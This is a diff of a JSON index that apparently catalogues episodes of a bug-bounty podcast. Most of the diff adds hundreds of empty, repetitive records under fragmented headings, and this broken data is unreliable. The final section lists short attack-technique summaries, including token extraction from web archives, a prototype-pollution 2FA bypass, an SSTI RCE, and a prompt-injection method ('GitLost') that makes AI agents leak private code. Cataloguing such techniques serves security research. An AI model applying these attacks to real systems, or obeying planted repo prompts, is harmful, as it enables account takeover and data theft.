+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 170,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 171,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 172,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 173,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 174,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 175,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 176,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 177,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 178,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 179,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 180,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 181,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 182,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 183,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 184,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      }
+    ],
     "to-Cloud Impersonation — Device Takeover": [
       {
         "episode": 98,
@@ -2184,6 +3626,1296 @@
         "episode": 58,
         "title": "Scroll-to-Text-Fragment Cross-Site Search Oracle",
         "target": "Any Chrome-browsed page",
+        "root_cause": "",
+        "impact": ""
+      }
+    ],
+    "world application": [
+      {
+        "episode": 1,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 2,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 3,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 4,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 5,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 6,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 7,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 8,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 9,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 10,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 11,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 12,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 13,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 14,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 15,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 16,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 17,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 18,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 19,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 20,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 21,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 22,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 23,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 24,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 25,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 26,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 27,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 28,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 29,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 30,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 31,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 32,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 33,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 34,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 35,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 36,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 37,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 38,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 39,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 40,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 41,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 42,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 43,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 44,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 45,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 46,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 47,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 48,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 49,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 50,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 51,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 52,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 53,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 54,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 55,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 56,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 57,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 58,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 59,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 60,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 61,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 62,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 63,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 64,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 65,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 66,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 67,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 68,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 69,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 70,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 71,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 72,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 73,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 74,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 75,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 76,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 77,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 78,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 79,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 80,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 81,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 82,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 83,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 84,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 85,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 86,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 87,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 88,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 89,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 90,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 91,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 92,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 93,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 94,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 95,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 96,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 97,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 98,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 99,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 100,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 101,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 102,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 103,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 104,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 105,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 106,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 107,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 108,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 109,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 110,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 111,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 112,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 113,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 114,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 115,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 116,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 117,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 118,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 119,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 120,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 121,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 122,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 123,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 124,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 125,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 126,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 127,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 128,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 129,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 130,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 131,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 132,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 133,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 134,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 135,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 136,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 137,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 138,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 139,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 140,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 141,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 142,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 143,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 144,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 145,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 146,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 147,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 148,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 149,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 150,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 151,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 152,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 153,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 154,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 155,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 156,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 157,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 158,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 159,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 160,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 161,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 162,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 163,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 164,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 165,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 166,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 167,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 168,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 169,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 170,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 171,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 172,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 173,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 174,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 175,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 176,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 177,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 178,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 179,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 180,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 181,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 182,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 183,
+        "title": "7. Real-world application",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 184,
+        "title": "7. Real-world application",
+        "target": "",
         "root_cause": "",
         "impact": ""
       }
@@ -4612,6 +7344,141 @@
       "episode": 179,
       "name": "Video POC for faster triage",
       "description": "Programs often have unwritten rules: if a trusted hacker submits a clear video POC, it gets triaged even if text report is complex"
+    },
+    {
+      "episode": 180,
+      "name": "Program triage SLA tracking",
+      "description": "Monitor HackerOne/BCP program stats pages for median first response time, time to bounty, time to resolution"
+    },
+    {
+      "episode": 180,
+      "name": "Severity guideline auditing",
+      "description": "Compare program's published severity matrix against CVSS; flag programs with vague or missing guidelines"
+    },
+    {
+      "episode": 180,
+      "name": "Bounty range transparency scoring",
+      "description": "Programs with published min/max per severity reduce negotiation friction and payment delays"
+    },
+    {
+      "episode": 180,
+      "name": "Public report analysis",
+      "description": "Review disclosed reports for triage quality, communication tone, and resolution fairness signals"
+    },
+    {
+      "episode": 180,
+      "name": "Program maturity scoring matrix",
+      "description": "Score programs on: triage SLA (1-5), bounty transparency (1-5), communication (1-5), payment reliability (1-5)"
+    },
+    {
+      "episode": 181,
+      "name": "Multi-agent swarm architecture",
+      "description": "Specialized agents (recon, fuzz, auth, logic, report) coordinated by orchestrator with shared context store"
+    },
+    {
+      "episode": 181,
+      "name": "Orchestrator-planner pattern",
+      "description": "Planner decomposes high-level goal (\"find auth bypass on target X\") into subtasks; dispatches to specialists; synthesizes results"
+    },
+    {
+      "episode": 181,
+      "name": "Unified API abstraction layer",
+      "description": "Single interface for all tools (nuclei, ffuf, custom scripts, browser automation); agents call tools via standardized schema"
+    },
+    {
+      "episode": 181,
+      "name": "Shared context store (vector DB + graph)",
+      "description": "All agents read/write to persistent context: discovered endpoints, auth mechanisms, tech stack, tested paths, findings"
+    },
+    {
+      "episode": 181,
+      "name": "Operation ID audit trail",
+      "description": "Every tool call tagged with UUID; findings must reference operation IDs — prevents hallucination, enables verification"
+    },
+    {
+      "episode": 181,
+      "name": "Coverage verification loop",
+      "description": "Orchestrator tracks which attack surfaces tested; rejects \"done\" signal until coverage threshold met"
+    },
+    {
+      "episode": 181,
+      "name": "Machine-readable PoC generation",
+      "description": "Agents output structured PoC (JSON: steps, requests, expected/actual responses, impact proof) for instant triage validation"
+    },
+    {
+      "episode": 182,
+      "name": "Wayback Bearer Token Extraction",
+      "description": "Searching archived HTTP requests and JS bundles for leftover guest tokens or partial auth headers with elevated scope"
+    },
+    {
+      "episode": 182,
+      "name": "Partial Auth Bypass via Legacy Endpoints",
+      "description": "Replaying guest/onboarding Bearer tokens against modern API endpoints that lack tenant isolation checks"
+    },
+    {
+      "episode": 182,
+      "name": "GraphQL Hackbot Schema Enumeration",
+      "description": "Automating GraphQL introspection discovery using LLM-guided path fuzzing and query batching"
+    },
+    {
+      "episode": 182,
+      "name": "Model Context Protocol (MCP) Security Tooling",
+      "description": "Wrapping security proxy interfaces and tools into standardized MCP schemas for direct agent control"
+    },
+    {
+      "episode": 182,
+      "name": "AI Execution Sandbox Security",
+      "description": "Auditing permission boundaries, prompt boundaries, and tool invocation hooks in autonomous AI security agents"
+    },
+    {
+      "episode": 183,
+      "name": "CSPT to ATO Chaining",
+      "description": "Using client-side path traversal to fetch attacker-controlled JSON responses, overwrite client state, and steal auth tokens"
+    },
+    {
+      "episode": 183,
+      "name": "Prototype Chain 2FA Bypass",
+      "description": "Polluting `Object.prototype` properties (e.g., `is_2fa_verified`) to bypass client-side two-factor checks"
+    },
+    {
+      "episode": 183,
+      "name": "Browser Sanitizer API Bypass",
+      "description": "Exploiting parser differentials and DOM mutations in native browser HTML sanitizers (Chrome/Firefox)"
+    },
+    {
+      "episode": 183,
+      "name": "AI Agent Context Leakage (GitLost)",
+      "description": "Injecting prompt payloads into public repos to force AI agents to output indexed private code snippets"
+    },
+    {
+      "episode": 183,
+      "name": "Razor SSTI Reflection RCE",
+      "description": "Constructing C# reflection calls with dynamic string concatenation to bypass Razor template sandbox restrictions"
+    },
+    {
+      "episode": 184,
+      "name": "Multi-Model Hackbot Load Distribution",
+      "description": "Routing task types (JS parsing, subdomains, endpoint extraction) to cheap models, reserving frontier LLMs for logic bugs"
+    },
+    {
+      "episode": 184,
+      "name": "Operator Moat Architecture",
+      "description": "Combining custom wordlists, stateful context databases, and proprietary agent prompts into an un-clonable competitive edge"
+    },
+    {
+      "episode": 184,
+      "name": "Hill-Climbing Payload Mutation",
+      "description": "Using feedback loops from HTTP response status codes and body changes to iteratively refine exploit payloads automatically"
+    },
+    {
+      "episode": 184,
+      "name": "Claude Code Proxy Integration",
+      "description": "Integrating Claude Code CLI directly with proxy logs (Caido/Burp) for inline traffic analysis and payload generation"
+    },
+    {
+      "episode": 184,
+      "name": "Agentic Test Environment Provisioning",
+      "description": "Automatically spinning up isolated containerized test environments modeled after target web stacks for safe exploit verification"
     }
   ],
   "techniques_by_name": {
@@ -4632,6 +7499,12 @@
     ],
     "AEM selector chaining": [
       176
+    ],
+    "AI Agent Context Leakage (GitLost)": [
+      183
+    ],
+    "AI Execution Sandbox Security": [
+      182
     ],
     "AI business logic flaws": [
       140
@@ -4689,6 +7562,9 @@
     ],
     "Age → DOB derivation": [
       171
+    ],
+    "Agentic Test Environment Provisioning": [
+      184
     ],
     "Alternative source hunting": [
       172
@@ -4774,6 +7650,12 @@
     "Blob body CSRF bypass": [
       103
     ],
+    "Bounty range transparency scoring": [
+      180
+    ],
+    "Browser Sanitizer API Bypass": [
